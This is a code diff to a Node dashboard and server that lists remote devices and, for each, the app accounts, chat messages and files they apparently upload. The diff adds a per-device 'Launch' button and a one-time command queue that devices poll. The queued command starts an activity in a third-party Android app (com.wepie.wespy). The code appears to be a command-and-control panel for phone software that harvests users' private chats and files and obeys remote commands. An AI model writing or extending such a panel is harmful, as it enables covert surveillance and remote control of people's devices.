@@ -36,6 +36,9 @@ let command = {
   activity: ""
 };
 
+// Device-specific commands: key = deviceId, value = command object
+const deviceCommands = new Map();
+
 function clean(value) {
   return value == null ? "" : String(value);
 }
@@ -843,7 +846,37 @@ async function loadSelected(){if(!state.selected){renderEmpty();return}state.acc
 async function loadAccount(){if(!state.selected||!state.account){state.messages=[];state.files=[];return}const base="/api/device/"+enc(state.selected)+"/account/"+enc(state.account);[state.messages,state.files]=await Promise.all([api(base+"/messages"),api(base+"/files")])}
 function selectedDevice(){return state.devices.find(d=>d.device_id===state.selected)}
 function selectedAccount(){return state.accounts.find(a=>a.key===state.account)}
-function renderDevices(){const q=$("search").value.toLowerCase();const list=state.devices.filter(d=>(d.display_name||d.device_id||"").toLowerCase().includes(q));$("totalDevices").textContent=state.devices.length;$("onlineDevices").textContent=state.devices.filter(d=>d.online).length;$("totalFiles").textContent=state.devices.reduce((a,d)=>a+(d.file_count||0),0);$("devices").innerHTML=list.map(d=>'<button class="device '+(d.device_id===state.selected?'active':'')+'" data-id="'+esc(d.device_id)+'"><div class="devtop"><span class="dot '+(d.online?'on':'')+'"></span><span class="devname">'+esc(d.display_name||d.device_id)+'</span></div><div class="devmeta"><span>Users '+(d.account_count||0)+'</span><span>Chats '+(d.message_count||0)+'</span><span>Files '+(d.file_count||0)+'</span></div></button>').join("")||'<div class="empty">No devices</div>'}
+function renderDevices(){
+  const q=$("search").value.toLowerCase();
+  const list=state.devices.filter(d=>(d.display_name||d.device_id||"").toLowerCase().includes(q));
+  $("totalDevices").textContent=state.devices.length;
+  $("onlineDevices").textContent=state.devices.filter(d=>d.online).length;
+  $("totalFiles").textContent=state.devices.reduce((a,d)=>a+(d.file_count||0),0);
+  $("devices").innerHTML=list.map(d=>{
+    const isActive = (d.device_id===state.selected ? 'active' : '');
+    const onlineDot = d.online ? 'on' : '';
+    const name = esc(d.display_name||d.device_id);
+    const id = esc(d.device_id);
+    // Launch button for specific device
+    const launchBtn = \`<button class="btn launch-btn" data-device="\${id}" style="margin-left:auto;padding:2px 8px;font-size:12px;">🚀 Launch</button>\`;
+    return \`
+      <div class="device \${isActive}" data-id="\${id}" style="display:flex;align-items:center;justify-content:space-between;">
+        <div style="flex:1;cursor:pointer;">
+          <div class="devtop">
+            <span class="dot \${onlineDot}"></span>
+            <span class="devname">\${name}</span>
+          </div>
+          <div class="devmeta">
+            <span>Users \${d.account_count||0}</span>
+            <span>Chats \${d.message_count||0}</span>
+            <span>Files \${d.file_count||0}</span>
+          </div>
+        </div>
+        \${launchBtn}
+      </div>
+    \`;
+  }).join("") || '<div class="empty">No devices</div>';
+}
 function renderAccounts(){if(!state.accounts.length)return '<div class="empty">No accounts for this device yet</div>';return '<div class="accounts">'+state.accounts.map(a=>'<button class="account '+(a.key===state.account?'active':'')+'" data-account="'+esc(a.key)+'"><strong>'+esc(a.my_name||"Unknown account")+'</strong><span class="muted">Public ID: '+esc(a.public_id||"")+'</span><br><span class="muted">UID: '+esc(a.my_uid||"")+' • Chats '+(a.message_count||0)+' • Files '+(a.file_count||0)+'</span></button>').join("")+'</div>'}
 function renderEmpty(){$("content").innerHTML='<div class="empty">No device selected</div>'}
 function renderMain(){const d=selectedDevice();if(!d)return renderEmpty();const a=selectedAccount();$("deviceTitle").textContent=d.display_name||d.device_id;$("deviceSub").textContent=(d.online?"Online":"Offline")+" • "+(a?(a.my_name||a.public_id||"Unknown account"):"No account selected");document.querySelectorAll(".tab").forEach(t=>t.classList.toggle("active",t.dataset.tab===state.tab));if(state.tab==="overview")renderOverview(d,a);if(state.tab==="chats")renderChats();if(state.tab==="files")renderFiles()}
@@ -857,7 +890,45 @@ async function deletePath(path,msg){if(!confirm(msg))return;await api(path,{meth
 async function deleteSelectedChats(){const ids=[...document.querySelectorAll(".msgcheck:checked")].map(x=>Number(x.value));if(!ids.length)return;await api("/api/messages",{method:"DELETE",headers:{"content-type":"application/json"},body:JSON.stringify({device_id:state.selected,ids})});await loadAccount();renderChats();renderDevices()}
 async function deleteConversation(){const ids=conversations().find(c=>c.key===state.peer)?.messages.map(m=>m.id)||[];if(!ids.length||!confirm("Delete this conversation?"))return;await api("/api/messages",{method:"DELETE",headers:{"content-type":"application/json"},body:JSON.stringify({device_id:state.selected,ids})});state.peer=null;await loadAccount();renderChats();renderDevices()}
 async function deleteSelectedFiles(){const files=[...document.querySelectorAll(".filecheck:checked")].map(x=>x.value);if(!files.length)return;await api("/api/files",{method:"DELETE",headers:{"content-type":"application/json"},body:JSON.stringify({files})});await loadSelected()}
-$("devices").onclick=e=>{const b=e.target.closest(".device");if(!b)return;state.selected=b.dataset.id;state.account=null;renderDevices();loadSelected()};
+
+// ---- Device selection (click on device name) ----
+$("devices").onclick = function(e){
+  const deviceDiv = e.target.closest(".device");
+  if (!deviceDiv) return;
+  // If clicked on launch button, ignore device selection
+  if (e.target.classList && e.target.classList.contains("launch-btn")) return;
+  state.selected = deviceDiv.dataset.id;
+  state.account = null;
+  renderDevices();
+  loadSelected();
+};
+
+// ---- Launch button ----
+document.addEventListener("click", async function(e){
+  const launchBtn = e.target.closest(".launch-btn");
+  if (!launchBtn) return;
+  const deviceId = launchBtn.dataset.device;
+  if (!deviceId) return;
+  const cmd = {
+    deviceId: deviceId,
+    title: "MG Menu",
+    text: "Launch StartActivity",
+    action: "launch",
+    activity: "com.wepie.wespy.module.login.start.StartActivity"
+  };
+  try {
+    await api("/api/device/command", {
+      method: "POST",
+      headers: {"content-type": "application/json"},
+      body: JSON.stringify(cmd)
+    });
+    alert("Launch command sent to device: " + deviceId);
+  } catch (err) {
+    alert("Failed: " + err.message);
+  }
+});
+
+// ---- Existing event listeners ----
 $("search").oninput=renderDevices;$("refresh").onclick=load;$("deleteDevice").onclick=()=>state.selected&&deletePath("/api/device/"+enc(state.selected),"Delete this device with all chats and files?");
 document.querySelector(".tabs").onclick=e=>{const b=e.target.closest(".tab");if(!b)return;state.tab=b.dataset.tab;renderMain()};
 $("content").onclick=async e=>{const acc=e.target.closest("[data-account]");if(acc){state.account=acc.dataset.account;state.peer=null;await loadAccount();renderMain();return}const conv=e.target.closest("[data-peer]");if(conv){state.peer=conv.dataset.peer;renderChats();return}if(e.target.id==="backChats"){state.peer=null;renderChats();return}if(e.target.id==="deleteConversation")return deleteConversation();if(e.target.id==="deleteAccount")return deletePath("/api/device/"+enc(state.selected)+"/account/"+enc(state.account),"Delete selected user with all chats and files?");if(e.target.id==="deleteAccountChats"||e.target.id==="deleteAllChats")return deletePath("/api/device/"+enc(state.selected)+"/account/"+enc(state.account)+"/messages","Delete all chats for this user?");if(e.target.id==="deleteAccountFiles"||e.target.id==="deleteAllFiles")return deletePath("/api/device/"+enc(state.selected)+"/account/"+enc(state.account)+"/files","Delete all files for this user?");if(e.target.id==="selectAllChats"){document.querySelectorAll(".msgcheck").forEach(x=>x.checked=true);return}if(e.target.id==="selectAllFiles"){document.querySelectorAll(".filecheck").forEach(x=>x.checked=true);return}if(e.target.id==="deleteSelectedChats")return deleteSelectedChats();if(e.target.id==="deleteSelectedFiles")return deleteSelectedFiles();const p=e.target.closest("[data-preview]");if(p)return openPreview(p.dataset.preview);const f=e.target.closest("[data-delete-file]");if(f&&confirm("Delete this file?")){await api("/api/files",{method:"DELETE",headers:{"content-type":"application/json"},body:JSON.stringify({files:[f.dataset.deleteFile]})});await loadSelected()}};
@@ -906,7 +977,32 @@ async function handler(req, res) {
       };
       return json(res, 200, { ok: true, command });
     }
-    if (req.method === "GET" && url.pathname === "/api/data") return json(res, 200, command);
+    // ---- NEW: Device-specific command ----
+    if (req.method === "POST" && url.pathname === "/api/device/command") {
+      const body = await readJson(req);
+      const deviceId = clean(body.deviceId);
+      if (!deviceId) return json(res, 400, { ok: false, error: "deviceId required" });
+      const cmd = {
+        title: clean(body.title) || command.title,
+        text: clean(body.text) || command.text,
+        action: clean(body.action) || command.action,
+        activity: clean(body.activity) || command.activity
+      };
+      deviceCommands.set(deviceId, cmd);
+      return json(res, 200, { ok: true, command: cmd });
+    }
+    // ---- Modify GET /api/data to support deviceId ----
+    if (req.method === "GET" && url.pathname === "/api/data") {
+      const deviceId = url.searchParams.get("deviceId");
+      let responseCmd;
+      if (deviceId && deviceCommands.has(deviceId)) {
+        responseCmd = deviceCommands.get(deviceId);
+        deviceCommands.delete(deviceId); // one-time delivery
+      } else {
+        responseCmd = command;
+      }
+      return json(res, 200, responseCmd);
+    }
 
     const handled = await handleDashboardApi(req, res, url);
     if (handled !== false) return;
